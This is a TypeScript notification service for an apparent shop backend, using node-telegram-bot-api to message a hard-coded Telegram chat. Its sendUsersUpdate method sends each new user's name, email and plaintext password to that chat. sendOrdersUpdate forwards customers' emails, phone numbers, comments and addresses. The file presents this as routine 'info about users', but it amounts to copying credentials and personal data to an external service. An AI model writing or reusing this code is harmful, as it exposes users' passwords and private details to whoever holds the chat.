import "reflect-metadata";
import { TYPES } from "./../../../types";
import { IConfigService } from "../../index";
import { inject, injectable } from "inversify";
import TelegramBot from "node-telegram-bot-api";
import { ITelegramService } from "./telegram.service.interface";
import { ISendUserUpdate, ISendOrdersUpdate } from "./telegram.types";

@injectable()
export class TelegramService implements ITelegramService {
	private token: string;
	private chatId: number;
	private bot: TelegramBot;
	constructor(
		@inject(TYPES.ConfigService) private configService: IConfigService
	) {
		this.chatId = 1549244915;
		console.log("chatId : " + this.chatId);
		this.token = this.configService.get("TELEGRAM_TOKEN");
		this.bot = new TelegramBot(this.token, { polling: true });
	}

	private async sendMessage(message: string) {
		try {
			await this.bot.sendMessage(this.chatId, message, {
				parse_mode: "Markdown",
			});
		} catch (error) {
			console.error("Error sending message:", error);
		}
	}

	// info about users
	async sendUsersUpdate({
		name,
		email,
		password,
	}: ISendUserUpdate): Promise<void> {
		const loginPass = password
			? password
			: "User logged in via GitHub or Google";

		const message = `New user: \n**Name**: ${name}\n**Email**: ${email}\n**Password**: ${loginPass}`;

		await this.sendMessage(message);
	}

	// info about orders
	async sendOrdersUpdate({
		email,
		phone,
		comment,
		address,
	}: ISendOrdersUpdate): Promise<void> {
		const message = `New order: \n**Email**: ${email}\n**Phone**: ${phone}\n**Comment**: ${comment}\n**Address**: ${address}`;

		await this.sendMessage(message);
	}
}
